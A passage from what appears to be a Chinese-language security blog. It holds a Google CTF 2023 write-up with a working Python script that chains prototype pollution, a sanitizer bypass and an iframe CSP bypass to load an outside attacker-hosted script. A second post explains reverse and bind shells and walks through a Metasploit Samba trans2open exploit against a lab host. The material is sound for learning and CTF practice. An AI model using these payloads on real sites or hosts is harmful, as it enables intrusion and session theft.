<li>Closure sanitizer 充當白名單，在使用者控制的資料插入 HTML 之前過濾掉潛在危險的屬性。</li>
<li>透過利用原型污染漏洞，您可以操縱消毒劑的白名單，允許未經授權的屬性通過。</li>
</ul>
</li>
<li>CSP 的角色：<ul>
<li>CSP 是一種由 Web 伺服器實現的安全性策略，用於限制應用程式載入腳本、樣式表、圖像和字體等資源的來源。</li>
<li>它旨在透過防止執行未經授權的來源的惡意程式碼來緩解 XSS（跨站腳本）攻擊等漏洞。</li>
</ul>
</li>
</ul>
<p>為什麼兩者都是必要的：</p>
<ul>
<li>Sanitizer Bypass Doesn’t Guarantee Execution：<ul>
<li>即使您繞過sanitizer並注入惡意屬性，也可能無法保證執行。</li>
<li>如果該屬性指向來自未經授權的來源的惡意腳本，CSP 仍可能會阻止該屬性的執行。</li>
</ul>
</li>
<li>CSP 實施限制：<ul>
<li>CSP 充當獨立的安全層，限制應用程式可以取得和執行程式碼的位置。</li>
<li>繞過清理程式僅允許未經授權的屬性，但 CSP 仍可能阻止它們載入惡意資源。</li>
</ul>
</li>
<li>例子：<ul>
<li>想像一下，您繞過 sanitizer 並注入指向惡意腳本的 onerror 屬性。</li>
<li>但是，如果 CSP 將腳本載入限製到特定網域，則惡意腳本將不會執行，從而防止攻擊。</li>
</ul>
</li>
<li>綜上所述：<ul>
<li>繞過 Closure sanitizer 可以讓您更自由地製作潛在的惡意元素。</li>
<li>要實現全面的攻擊，您通常還需要繞過 CSP。它充當單獨的防禦層，確保即使未經授權的屬性漏掉，由於來源限制，它們也不一定能夠執行惡意程式碼。</li>
</ul>
</li>
</ul>
<h3 id="CSP-bypass-by-restricting-CSP"><a href="#CSP-bypass-by-restricting-CSP" class="headerlink" title="CSP bypass by restricting CSP"></a><strong>CSP bypass by restricting CSP</strong></h3><p>先來查找XSS漏洞</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;trustedResourceUrl&#125; <span class="keyword">from</span> <span class="string">&#x27;safevalues&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;safeScriptEl&#125; <span class="keyword">from</span> <span class="string">&#x27;safevalues/dom&#x27;</span>;</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">loadEditorResources</span>(<span class="params"></span>) &#123;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="keyword">const</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  safeScriptEl.<span class="title function_">setSrc</span>(script, <span class="title function_">trustedResourceUrl</span>(editor));</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>();</span><br><span class="line">  <span class="keyword">if</span> (!location.<span class="property">pathname</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;/view/&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title function_">loadEditorResources</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>前面import了trustedResourceUrl</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/google/safevalues/tree/main/src#trustedresourceurl">safevalues/src 在 main ·谷歌/安全值 ·GitHub上</a></li>
</ul>
<p><img src="img/GoogleCTFCSP_3.png" alt="Untitled"></p>
<ul>
<li>Script URLs 可能很危險，因為它們允許在目前網頁的來源（網域）內執行程式碼</li>
<li>僅僅知道 URL 的來源是不夠的。惡意行為者可以利用某些網域上的開放重定向來重新導向到包含有害腳本的任意 URL</li>
</ul>
<p>通過查看 <code>!location.pathname.startsWith(&#39;/view/&#39;</code>) ，能發現他從bootstrap.js獲取變數</p>
<p><img src="img/GoogleCTFCSP_4.png" alt="Untitled"></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!location.<span class="property">pathname</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;/view/&#x27;</span>)) &#123;</span><br><span class="line">  ....</span><br><span class="line">  editor = (<span class="function"><span class="params">x</span>=&gt;</span>x)<span class="string">`/static/editor.js`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">(<span class="function">()=&gt;</span>&#123;<span class="keyword">var</span> e=<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="title class_">Field</span>(<span class="string">&quot;editMe&quot;</span>);e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">BasicTextFormatter</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">RemoveFormatting</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">UndoRedo</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">ListTabHandler</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">SpacesTabHandler</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">EnterHandler</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">HeaderFormatter</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="title class_">LoremIpsum</span>(<span class="string">&quot;Click here to edit&quot;</span>)),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">LinkDialogPlugin</span>),e.<span class="title function_">registerPlugin</span>(<span class="keyword">new</span> goog.<span class="property">editor</span>.<span class="property">plugins</span>.<span class="property">LinkBubble</span>);<span class="keyword">const</span> o=[goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">LINK</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">BOLD</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">ITALIC</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">UNORDERED_LIST</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">FONT_COLOR</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">FONT_FACE</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">FONT_SIZE</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">JUSTIFY_LEFT</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">JUSTIFY_CENTER</span>,goog.<span class="property">editor</span>.<span class="property">Command</span>.<span class="property">JUSTIFY_RIGHT</span>];<span class="keyword">var</span> g=goog.<span class="property">ui</span>.<span class="property">editor</span>.<span class="property">DefaultToolbar</span>.<span class="title function_">makeToolbar</span>(o,goog.<span class="property">dom</span>.<span class="title function_">getElement</span>(<span class="string">&quot;toolbar&quot;</span>));<span class="keyword">new</span> goog.<span class="property">ui</span>.<span class="property">editor</span>.<span class="title class_">ToolbarController</span>(e,g),e.<span class="title function_">makeEditable</span>(),goog.<span class="property">events</span>.<span class="title function_">listen</span>(e,goog.<span class="property">editor</span>.<span class="property">Field</span>.<span class="property">EventType</span>.<span class="property">DELAYEDCHANGE</span>,(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">let</span> o=e.<span class="title function_">getCleanContents</span>(),g=goog.<span class="property">dom</span>.<span class="title function_">getElement</span>(<span class="string">&quot;youtube&quot;</span>).<span class="property">value</span>;<span class="keyword">if</span>(g.<span class="title function_">startsWith</span>(<span class="string">&quot;https://www.youtube.com/watch&quot;</span>))&#123;<span class="keyword">let</span> e=<span class="keyword">new</span> <span class="title function_">URL</span>(g),t=<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(e.<span class="property">search</span>),i=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);i.<span class="property">src</span>=<span class="string">`https://www.youtube.com/embed/<span class="subst">$&#123;t.get(<span class="string">&quot;v&quot;</span>)&#125;</span>`</span>,i.<span class="property">width</span>=<span class="string">&quot;560&quot;</span>,i.<span class="property">height</span>=<span class="string">&quot;315&quot;</span>,o+=<span class="string">&quot;&lt;br&gt;&quot;</span>+i.<span class="property">outerHTML</span>&#125;<span class="keyword">let</span> t=sanitizer.<span class="title function_">sanitize</span>(o);<span class="title function_">setInnerHTML</span>(goog.<span class="property">dom</span>.<span class="title function_">getElement</span>(<span class="string">&quot;preview&quot;</span>),t),goog.<span class="property">dom</span>.<span class="title function_">getElement</span>(<span class="string">&quot;introduction&quot;</span>).<span class="property">value</span>=t&#125;))&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>簡單來說他的調用流程是</p>
<p>main.js &gt; !location.pathname.startsWith(‘/view/’) &gt; bootstrap.js &gt; editor = (x=&gt;x) /static/editor.js; &gt; main.js &gt; safeScriptEl.setSrc(script, trustedResourceUrl(editor)) &gt; editor (bootstrap.js)</p>
<p>如果攻擊者能夠控制 editor 變數，並將其設置為指向包含惡意 JavaScript 的 URL，那麼當該頁面被其他用戶訪問時，瀏覽器將會自動下載並執行這個指定的 JavaScript，從而觸發 XSS 漏洞，使得攻擊者能夠在受害者的瀏覽器上執行任意的 JavaScript ，從而達到竊取用戶信息、盜取會話令牌、導致用戶重定向到惡意網站等惡意目的</p>
<p>查看 Closure sanitizer 配置，如果 iframe 內的頁面與父頁面same-origin，則可以使用 iframe 中的屬性來阻止 iframe 內的某些資源（使用 CSP）。因此，您可以阻止loading</p>
<p>我們可以使用的一個巧妙技巧是 iframe 並使用 csp 屬性對嵌入文件強制實施內容安全策略（請注意，這又是一個僅在 Chrome 61+ 中存在的實驗性功能，但在 Firefox 或 Safari 中不存在），使用以下 iframe 來阻止在 iframe 中的文件中載入</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]&quot;</span> csp=<span class="string">&quot;script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>這個 JavaScript 文件將會被用於在 iframe 中執行，從而繞過了對主要頁面的 CSP (Content Security Policy) 限制。</p>
<ol>
<li><strong>利用原型污染漏洞控制變數</strong>：利用之前發現的原型污染漏洞，將變數（<strong>editor</strong>）設置為指向惡意的 JavaScript 文件的 URL。這樣做可以控制網頁加載的腳本，從而執行任意的 JavaScript 。</li>
<li><strong>使用 iframe 嵌入</strong>：將包含惡意 JavaScript 的 iframe 嵌入到主要頁面中。這樣，即使主頁面上的 CSP 配置阻止直接載入該 JavaScript，但在 iframe 中載入的 JavaScript 仍然可以執行。這就是通過 iframe 的方式來繞過 CSP 的限制。</li>
<li><strong>利用頁面路徑的特性</strong>：這個攻擊利用了頁面路徑的特性，特別是對 <strong>/view/</strong> 路徑的處理。在這個應用中，當 URL 的路徑以 <strong>/view/</strong> 開頭時，不會執行與頁面初始化相關的程式。但是，通過將路徑設置為 <strong>/test/view/[bio_uuid]</strong>，在此之後的所有路徑信息都會被視為 UUID，並且相應的初始化程式將被執行。</li>
</ol>
<p>綜合這些步驟，可以成功地繞過主頁面的 CSP 限制，並在 iframe 中執行惡意的 JavaScript ，從而實現 XSS 攻擊。</p>
<p>以下python腳本創建第一個 Bio 並覆蓋第一個 Bio，並使用特定的 CSP 對第一個 Bio 進行 iframe</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">#!<span class="regexp">/usr/</span>bin/env python</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">URL</span> = <span class="string">&quot;https://biohazard-web.2023.ctfcompetition.com&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">first_response = requests.<span class="title function_">post</span>(f<span class="string">&quot;&#123;URL&#125;/create&quot;</span>, headers=headers, json=&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;introduction&quot;</span>: <span class="string">&quot;&lt;a id=editor href=https://attack.shhnjk.com/alert.js&gt;&lt;/a&gt;&lt;a id=editor&gt;&lt;/a&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;favorites&quot;</span>: &#123;<span class="string">&quot;hobbies&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;sports&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;* ID&quot;</span>: <span class="title class_">True</span>&#125;</span><br><span class="line">&#125;)</span><br><span class="line">first_bio = first_response.<span class="title function_">json</span>()</span><br><span class="line"></span><br><span class="line">second_response = requests.<span class="title function_">post</span>(f<span class="string">&quot;&#123;URL&#125;/create&quot;</span>, headers=headers, json=&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;introduction&quot;</span>: f<span class="string">&quot;&lt;iframe src=\&quot;&#123;URL&#125;/views/view/&#123;first_bio[&#x27;id&#x27;]&#125;\&quot; csp=\&quot;script-src https://attack.shhnjk.com/alert.js &#123;URL&#125;/static/closure-library/ &#123;URL&#125;/static/sanitizer.js &#123;URL&#125;/static/main.js &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;\&quot;&gt;&lt;/iframe&gt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;favorites&quot;</span>: &#123;<span class="string">&quot;hobbies&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;sports&quot;</span>: <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;IFRAME CSP&quot;</span>: <span class="title class_">True</span>&#125;</span><br><span class="line">&#125;)</span><br><span class="line">second_bio = second_response.<span class="title function_">json</span>()</span><br><span class="line"><span class="title function_">print</span>(f<span class="string">&quot;Report URL: &#123;URL&#125;/view/&#123;second_bio[&#x27;id&#x27;]&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# python3 expjs.<span class="property">py</span> </span><br><span class="line"><span class="title class_">Report</span> <span class="attr">URL</span>: <span class="attr">https</span>:<span class="comment">//biohazard-web.2023.ctfcompetition.com/view/9991bfe8-c422-4258-89d3-600b305c8a07</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>並開啟網頁查看，可以看到成功繞過了CSP嵌入了iframe語法</p>
<p><img src="img/GoogleCTFCSP_5.png" alt="Untitled"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="exploit-Exploitation Basics" class="article article-type-exploit" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Exploitation%20Basics/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.082Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Exploitation%20Basics/">
        Exploitation Basics
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Exploitation-Basics"><a href="#Exploitation-Basics" class="headerlink" title="Exploitation Basics"></a>Exploitation Basics</h1><h3 id="Reverse-Shells-vs-Bind-Shells"><a href="#Reverse-Shells-vs-Bind-Shells" class="headerlink" title="Reverse Shells vs Bind Shells"></a>Reverse Shells vs Bind Shells</h3><p>參考文章:<a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10279849?sc=hot">https://ithelp.ithome.com.tw/articles/10279849?sc=hot</a></p>
<ul>
<li>所有的shell都是對機器的訪問</li>
<li>彈出shell -&gt; 可以訪問一台機器</li>
<li><p>reverse shell &gt; 受害者連接到攻擊機器</p>
<p>  <img src="img/exploit_Untitled.png" alt="Untitled"></p>
<ul>
<li>nc &gt; 監聽一個端口<ul>
<li>lvp &gt; listening verbose part</li>
<li>電腦打開某端口</li>
</ul>
</li>
<li>在 /bin/sh 建立連線 &gt; 對象是 windows 是 cmd.exe</li>
<li>攻擊者(local)端監聽任何對4444 port的發起的連線</li>
<li>讓目標主機(受害者端)對攻擊者端的4444 port發起連線</li>
<li><p>雙方建立連線後</p>
<p><img src="img/exploit_Untitled_1.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p>bind shell &gt; 在機器上打開一個端口連接到目標</p>
<p>  <img src="img/exploit_Untitled_2.png" alt="Untitled"></p>
<ul>
<li>當使用nc在特定端口上連接到特定目標機器時，對方會監聽攻擊機器的連接</li>
<li>綁定到目標(受害者)主機上的<strong>特定</strong>port來監聽傳入連接的shell，攻擊者會通過這port連到目標(受害)機器上</li>
<li>先使用nc 將 /bin/sh 綁定受害機器上的4444port</li>
<li>攻擊者在通過這個port連回受害機器</li>
</ul>
</li>
<li>Reverse shell是從受害<strong>主機對攻擊者主機</strong>發起連線 &gt; 受害者連接到攻擊機</li>
<li>Bind Shell是先在受害主機上綁定特定port，然後等來自<strong>攻擊者主機對受害主機</strong>發起連線，就像後門(backdoor)一樣 &gt; 攻擊者可以連接到受害者</li>
</ul>
<h3 id="Staged-vs-Non-Staged-Payloads"><a href="#Staged-vs-Non-Staged-Payloads" class="headerlink" title="Staged vs Non-Staged Payloads"></a><strong>Staged vs Non-Staged Payloads</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> 	        Staged vs Non-Staged Payloads</span><br><span class="line">                              |</span><br><span class="line">          -----------------------------------</span><br><span class="line">          |                                 |</span><br><span class="line">    Staged Payloads                    Non-Staged Payloads</span><br><span class="line">  |                   |            |                       |</span><br><span class="line">Meterpreter         Shell       Reverse TCP              Bind TCP</span><br><span class="line">  |                   |            |                       |</span><br><span class="line">Multiple Stages      Single     Two-Part Payload        Single-Part Payload</span><br><span class="line">  |                   |            |                       |</span><br><span class="line">Smaller Size     Easier to use    Versatile            Larger Size</span><br></pre></td></tr></table></figure>
<p>根據內容使用不同類型的payload</p>
<p>exploit是利用漏洞的程式碼，而payload可以造成損害</p>
<p>有些payload是我們用來發送給受害者並嘗試在機器上獲取shell的內容</p>
<ul>
<li><p>Non-staged</p>
<ul>
<li>Sends exploit shellcode all at once</li>
<li>Larger in size and won’t always work</li>
<li>Example: windows/meterpreter_reverse_tcp</li>
<li>此Payload被完整地發送，包括漏洞利用</li>
<li>隨著利用的運行而整體全部發送出去</li>
<li>Payload包括了所選任務的利用和全部shell程式碼</li>
<li>一體化的負荷更加穩定</li>
<li>這些Payload比其它類型Payload更大</li>
</ul>
</li>
<li><p>Staged</p>
<ul>
<li>Sends payload in stages</li>
<li>Can be less stable</li>
<li>Example: windows/meterpreter/reverse_tcp</li>
<li>指令中meterpreter後面有一個「<strong>/</strong>」字符，象徵一個<strong>Staged</strong> Payload</li>
<li>通常會被分成兩部分被發送</li>
<li>第一個部分包含一個小的Payload，用來使受害機器回連攻擊者</li>
<li>然後再傳輸第二個更大的Payload，這包含了剩餘的shellcode，然後整個Payload才能被執行</li>
<li>這類載Payload可用於有大小限制的環境或是規避檢測</li>
<li>透過網路載入這些元件會產生相當大的流量，並可能提醒防禦機制</li>
<li><code>可以幫助規避防毒軟體</code></li>
</ul>
</li>
<li>正<strong>斜線</strong>“ <strong>/</strong> ”字元用於區分Non-staged Payload和Staged Payload。</li>
<li>Metasploit 框架將漏洞利用與成功利用後執行的內容（有效負載）分開</li>
<li><p>Metasploit框架中的有效負載也分為兩部分，stager和stage。</p>
<ul>
<li><p>stager 負責下載大的有效負載（階段），將其註入內存，並將執行傳遞給它</p>
<p><img src="img/exploit_Untitled_3.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p>許多可利用的情況限制了攻擊者可以在不改變的情況下將多少位元組載入到記憶體中的一個連續位置</p>
</li>
<li>這些情況下進行有趣的後期利用的一種方法是分階段交付Payload</li>
<li>Stagers 通常是用手工優化的彙編語言編寫的。攻擊者的目標是使 stager 盡可能小</li>
<li>小型 stager 使攻擊者可以自由地使用它進行更多攻擊</li>
</ul>
<h3 id="Gaining-Root-with-Metasploit"><a href="#Gaining-Root-with-Metasploit" class="headerlink" title="Gaining Root with Metasploit"></a><strong>Gaining Root with Metasploit</strong></h3><p>根據之前的掃描結果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] 192.168.19.140:139    -   Host could not be identified: Unix (**Samba 2.2.1a**)</span><br></pre></td></tr></table></figure>
<p>利用searchploit尋找發現的服務版本漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# searchsploit samba 2.2    </span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                               |  Path</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Samba 2.0.x/2.2 - Arbitrary File Creation                                    | unix/remote/20968.txt</span><br><span class="line">Samba 2.2.0 &lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit)                 | osx/remote/9924.rb</span><br><span class="line">Samba 2.2.2 &lt; 2.2.6 - <span class="string">&#x27;nttrans&#x27;</span> Remote Buffer Overflow (Metasploit) (1)      | linux/remote/16321.rb</span><br><span class="line">Samba 2.2.8 (BSD x86) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)            | bsd_x86/remote/16880.rb</span><br><span class="line">****Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalat | linux/local/23674.txt</span><br><span class="line">Samba 2.2.8 (Linux x86) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)          | linux_x86/remote/16861.rb</span><br><span class="line">Samba 2.2.8 (OSX/PPC) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)            | osx_ppc/remote/16876.rb</span><br><span class="line">Samba 2.2.8 (Solaris SPARC) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)      | solaris_sparc/remote/16330.rb</span><br><span class="line">Samba 2.2.8 - Brute Force Method Remote Command Execution                    | linux/remote/55.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (1)                   | unix/remote/22468.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (2)                   | unix/remote/22469.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (3)                   | unix/remote/22470.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (4)                   | unix/remote/22471.txt</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;nttrans&#x27;</span> Remote Overflow (Metasploit)                         | linux/remote/9936.rb</span><br><span class="line">Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow      | unix/remote/22356.c</span><br><span class="line">Samba 2.2.x - Remote Buffer Overflow                                         | linux/remote/7.pl</span><br><span class="line">Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution                            | multiple/remote/10.c</span><br><span class="line">Samba &lt; 3.0.20 - Remote Heap Overflow                                        | linux/remote/7701.txt</span><br><span class="line">Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                | linux_x86/dos/36741.py</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
<p>開啟msf利用該漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search samba 2.2</span><br><span class="line">                                                                                                               </span><br><span class="line">Matching Modules                                                                                               </span><br><span class="line">================                                                                                               </span><br><span class="line">                                                                                                               </span><br><span class="line">   <span class="comment">#  Name                              Disclosure Date  Rank     Check  Description                           </span></span><br><span class="line">   -  ----                              ---------------  ----     -----  -----------                                          </span><br><span class="line">   0  exploit/multi/samba/nttrans       2003-04-07       average  No     Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow</span><br><span class="line">   1  exploit/freebsd/samba/trans2open  2003-04-07       great    No     Samba trans2open Overflow (*BSD x86)</span><br><span class="line">   **2  exploit/linux/samba/trans2open    2003-04-07       great    No     Samba trans2open Overflow (Linux x86)**</span><br><span class="line">   3  exploit/osx/samba/trans2open      2003-04-07       great    No     Samba trans2open Overflow (Mac OS X PPC)</span><br><span class="line">   4  exploit/solaris/samba/trans2open  2003-04-07       great    No     Samba trans2open Overflow (Solaris SPARC)</span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 4, use 4 or use exploit/solaris/samba/trans2open</span><br><span class="line"></span><br><span class="line">msf6 &gt; use exploit/linux/samba/trans2open</span><br><span class="line">[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name    Current Setting  Required  Description</span><br><span class="line">   ----    ---------------  --------  -----------</span><br><span class="line">   **RHOSTS                   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using**</span><br><span class="line">                                      -metasploit.html</span><br><span class="line">   RPORT   139              <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; <span class="built_in">set</span> RHOSTS 192.168.19.140</span><br><span class="line">RHOSTS =&gt; 192.168.19.140</span><br><span class="line">msf6 exploit(linux/samba/trans2open) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffdfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffcfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffbfc...</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffffafc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 5 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff9fc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 6 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff8fc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 7 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff7fc...</span><br><span class="line">[*] Sending stage (1017704 bytes) to 192.168.19.140</span><br><span class="line">[*] 192.168.19.140 - Meterpreter session 8 closed.  Reason: Died</span><br><span class="line">[*] 192.168.19.140:139 - Trying <span class="built_in">return</span> address 0xbffff6fc...</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<ul>
<li><p>解決run運行問題</p>
<p>  有時候kali在運行run後會出現</p>
